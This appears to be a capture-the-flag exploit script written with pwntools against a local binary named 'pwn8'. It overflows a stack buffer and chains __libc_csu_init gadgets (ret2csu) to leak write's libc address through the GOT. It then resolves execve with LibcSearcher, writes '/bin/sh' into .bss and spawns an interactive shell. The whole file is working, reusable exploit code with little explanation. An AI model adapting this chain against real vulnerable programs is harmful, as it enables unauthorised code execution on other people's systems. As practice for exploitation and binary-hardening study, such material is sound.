from pwn import *
from LibcSearcher import *

#context.log_level = 'debug'

pwn8 = ELF('./pwn8')
sh = process('./pwn8')

write_got = pwn8.got['write']
read_got = pwn8.got['read']
main_addr = pwn8.symbols['main']
bss_base = pwn8.bss()

csu_front_addr = 0x00000000004005F0 # gadget 2.
csu_end_addr = 0x0000000000400606 # gadget 1, 

fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call

    # in my case, is the following case.
    # rdi=edi=r13d
    # rsi=r14
    # rdx=r15

    payload = 'a' * 0x80 + fakeebp # 0x80 offset to rbp, then 8 bytes to the ret_addr.
    
    ## put the address of the gadget 1
    payload += p64(csu_end_addr)
    payload += 'a'* 8 ## suplement for the additional rsp addition. i.e., add rsp, 38h.

    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    ## then put the address of the gadget 2, to call function
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38 
    payload += p64(last)
    sh.send(payload)
    sleep(1)


gdb.attach(sh)

sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 1, write_got, 8, main_addr)


# sh.recvuntil('Hello, World\n')
write_addr = u64(sh.recv(8))
print "write_addr, ", hex(write_addr), write_addr
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))

####--- orignal test.
## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 0, bss_base, 16, main_addr)

sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)

sh.interactive()